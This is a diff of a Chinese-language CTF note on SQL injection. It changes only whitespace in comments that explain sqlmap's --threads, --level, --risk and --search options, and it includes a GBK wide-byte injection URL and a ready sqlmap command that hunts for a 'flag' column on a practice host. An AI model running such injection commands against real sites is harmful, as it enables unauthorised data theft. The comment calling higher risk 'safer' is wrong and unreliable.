@@ -16,11 +16,11 @@ SQL注入小技巧
 		http://chinalover.sinaapp.com/SQL-GBK/index.php?id=%df'
 
 		--threads 10	//如果你玩过 msfconsole的话会对这个很熟悉 sqlmap线程最高设置为10
-		--level 3 		//sqlmap默认测试所有的GET和POST参数，当--level的值大于等于2的时候也会测试HTTP 
-						Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。最高可到5
-		--risk 3 		// 执行测试的风险（0-3，默认为1）risk越高，越慢但是越安全
-		--search 		//后面跟参数 -D -T -C 搜索列（S），表（S）和或数据库名称（S） 如果你脑子够聪明，
-						应该知道库列表名中可能会有ctf,flag等字样.
+		--level 3 	//sqlmap默认测试所有的GET和POST参数，当--level的值大于等于2的时候也会测试HTTP 
+				Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。最高可到5
+		--risk 3 	// 执行测试的风险（0-3，默认为1）risk越高，越慢但是越安全
+		--search 	//后面跟参数 -D -T -C 搜索列（S），表（S）和或数据库名称（S） 如果你脑子够聪明，
+				应该知道库列表名中可能会有ctf,flag等字样.
 
 
 - 执行 ``sqlmap -u "http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df%27" --search -C flag --level 3 --risk 1 --thread 10`` 
